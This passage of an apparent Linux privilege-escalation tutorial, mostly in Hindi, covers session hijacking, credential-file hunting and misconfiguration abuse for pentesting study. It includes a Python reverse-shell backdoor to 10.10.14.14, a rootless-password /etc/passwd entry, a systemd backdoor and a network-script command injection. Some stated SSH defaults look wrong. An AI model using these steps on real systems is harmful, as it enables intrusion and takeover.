{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

किसी डायरेक्टरी में, **"execute" के लिए bit** यह इंगित करता है कि प्रभावित user उस फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** bit यह संकेत देता है कि user फ़ाइलों की **list** कर सकता है, और **"write"** bit यह संकेत देता है कि user नई **files** **create** और मौजूद **files** **delete** कर सकता है।

## ACLs

Access Control Lists (ACLs) विवेकानुसार अनुमतियों की द्वितीयक परत का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **override** करने में सक्षम हैं। ये permissions फ़ाइल या डायरेक्टरी एक्सेस पर अधिक नियंत्रण बढ़ाते हैं, जिससे मालिक नहीं होने वाले या समूह का हिस्सा न होने वाले विशिष्ट users को अधिकार देने या अस्वीकार करने की अनुमति मिलती है। इस स्तर की **सूक्ष्मता (granularity) अधिक सटीक एक्सेस प्रबंधन सुनिश्चित करती है**। अधिक विवरण [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकता है।

**Give** user "kali" को किसी फ़ाइल पर पढ़ने और लिखने की अनुमति दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

पुराने संस्करणों में आप किसी अलग उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं。\
नवीनतम संस्करणों में आप केवल अपने ही **screen sessions** से **connect** कर पाएँगे। हालांकि, आप **interesting information inside the session** पा सकते हैं।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **old tmux versions** के साथ थी। मैं एक non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से संलग्न हों**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
उदाहरण के लिए **Valentine box from HTB** देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS पर नया ssh key बनाने के दौरान होता है, क्योंकि **केवल 32,768 variations संभव थे**। इसका मतलब है कि सभी संभावनाएँ कैलकुलेट की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH के महत्वपूर्ण configuration मान

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह बताता है कि क्या सर्वर खाली password string वाले अकाउंट्स में लॉगिन की अनुमति देता है। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि root ssh का उपयोग करके लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root password और private key का उपयोग करके लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही लॉगिन कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और तब ही लॉगिन कर सकता है जब commands विकल्प निर्दिष्ट हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें वे public keys होते हैं जिनका उपयोग user authentication के लिए किया जा सकता है। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें होम डायरेक्टरी से बदला जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अपने local SSH keys का उपयोग करने की अनुमति देता है, बजाय इसके कि keys (बिना passphrases!) आपके server पर रखी जाएँ। इसलिए, आप ssh के माध्यम से एक host पर **jump** कर पाएँगे और वहाँ से दूसरी host पर भी उसी **key** का उपयोग करके **jump** कर सकेंगे जो आपके **initial host** पर स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि अगर `Host` `*` है तो हर बार जब user किसी दूसरी मशीन पर जाता है, उस host को keys तक पहुँचने की क्षमता मिल जाएगी (यह एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

यदि आप किसी environment में Forward Agent configured पाते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **आप इसे abuse करके escalate privileges कर सकते हैं**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत मौजूद फ़ाइलें **स्क्रिप्ट हैं जो तब execute होती हैं जब कोई user नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी को भी **लिख या संशोधित कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script पाया जाता है तो आपको इसे **संवेदनशील विवरणों** के लिए जाँचना चाहिए।

### Passwd/Shadow फ़ाइलें

OS के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलें अलग नाम से हो सकती हैं या उनका कोई बैकअप मौजूद हो सकता है। इसलिए यह सुझाव दिया जाता है कि **उन सभी को ढूँढें** और **जाँचें कि आप उन्हें पढ़ सकते हैं या नहीं** ताकि आप देख सकें **क्या फाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित कमांडों में से किसी एक का उपयोग करके एक password बनाएं।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर user `hacker` जोड़ें और जनरेट किया गया password जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्न पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स पर `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है; साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप कुछ **संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन एक **tomcat** server चला रही है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** तो आप इन लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### फ़ोल्डरों की जाँच करें

निम्नलिखित फ़ोल्डर्स में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी वाले को पढ़ने में सक्षम नहीं होंगे, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **स्क्रिप्ट/बाइनरी PATH में**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह **कई संभावित फ़ाइलों की तलाश करता है जिनमें पासवर्ड हो सकते हैं**.\
**इस्तेमाल करने के लिए एक और दिलचस्प टूल** है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है जिसका उपयोग Windows, Linux & Mac पर स्थानीय कंप्यूटर में संग्रहित कई पासवर्ड निकालने के लिए किया जाता है।

### लॉग्स

यदि आप लॉग्स पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब लॉग होगा, उतना ही (संभवतः) रोचक होगा।\
इसके अलावा, कुछ "**खराब**" कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs के अंदर **पासवर्ड रिकॉर्ड करने** की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग पढ़ने के लिए [**adm**](interesting-groups-linux-pe/index.html#adm-group) समूह बहुत मददगार होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके नाम में या सामग्री के अंदर शब्द "**password**" मौजूद हो, और साथ ही logs के अंदर IPs और emails, या hashes regexps की भी जाँच करें।\
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा/रही, लेकिन अगर आप रुचि रखते हैं तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए जाने वाले अंतिम चेक्स देख सकते हैं।

## लिखने योग्य फ़ाइलें

### Python library hijacking

यदि आप जानते हैं कि **कहां** से कोई python script execute होने वाली है और आप उस फ़ोल्डर में **लिख सकते हैं** या आप **python libraries को संशोधित कर सकते हैं**, तो आप OS लाइब्रेरी को संशोधित करके उसे backdoor कर सकते हैं (यदि आप उस जगह पर लिख सकते हैं जहाँ python script execute होगी, तो os.py लाइब्रेरी को copy और paste कर लें)।

लाइब्रेरी में **backdoor the library** करने के लिए बस os.py लाइब्रेरी के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability उन उपयोगकर्ताओं को जिनके पास किसी log फ़ाइल या उसके parent directories पर **write permissions** हैं संभावित रूप से escalated privileges दिला सकती है। इसका कारण यह है कि `logrotate`, जो अक्सर **root** के रूप में चल रहा होता है, को arbitrary फ़ाइलें execute करने के लिए manipulate किया जा सकता है, खासकर _**/etc/bash_completion.d/**_ जैसे डाइरेक्टरीज़ में। यह ज़रूरी है कि आप permissions सिर्फ _/var/log_ में ही नहीं बल्कि उन किसी भी डायरेक्टरी में भी चेक करें जहाँ log rotation apply होती है।

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** से बहुत मिलती-जुलती है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, तो यह जांचें कि वे logs कौन manage कर रहा है और यह भी देखिए कि क्या आप symlinks के ज़रिए logs को बदलकर escalate privileges कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई user _/etc/sysconfig/network-scripts_ में एक `ifcf-<whatever>` script **write** करने में सक्षम है **या** वह मौज़ूद एक script को **adjust** कर सकता है, तो आपका **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, नेटवर्क कनेक्शनों के लिए उपयोग होते हैं। ये बिल्कुल .INI फ़ाइलों की तरह दिखते हैं। हालाँकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute को सही तरीके से handle नहीं किया जा रहा था। अगर name में **white/blank space** है तो सिस्टम उस white/blank space के बाद के हिस्से को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद सब कुछ root के रूप में execute हो जाता है**।

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें कि Network और /bin/id_ के बीच एक खाली जगह है_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो कि क्लासिक Linux service management system है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाली स्क्रिप्ट्स शामिल होती हैं। इन्हें सीधे चलाया जा सकता है या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से। Redhat सिस्टम में वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश की गई एक नया **service management** है और service management कार्यों के लिए configuration files का उपयोग करती है। Upstart पर संक्रमण के बावजूद, Upstart में एक compatibility layer होने के कारण SysVinit स्क्रिप्ट्स अभी भी Upstart कॉन्फ़िगरेशन के साथ उपयोग की जाती हैं।

**systemd** आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी उन्नत विशेषताएँ प्रदान करता है। यह फाइलों को `/usr/lib/systemd/` (distribution packages के लिए) और `/etc/systemd/system/` (administrator modifications के लिए) में व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल होती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर privileged kernel फ़ंक्शनैलिटी को userspace manager तक पहुँचाने के लिए syscall को hook करते हैं। कमजोर manager authentication (जैसे FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से-rooted devices पर root तक escalate करने में सक्षम बना सकता है। अधिक जानने और exploitation विवरण के लिए यहां देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery प्रोसेस command lines से एक binary path निकाल सकता है और इसे एक privileged context में -v के साथ execute कर सकता है। permissive patterns (जैसे \S का उपयोग) writable लोकेशनों (उदा. /tmp/httpd) में attacker-staged listeners से मेल खा सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path).

अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाले सामान्यीकृत पैटर्न को यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
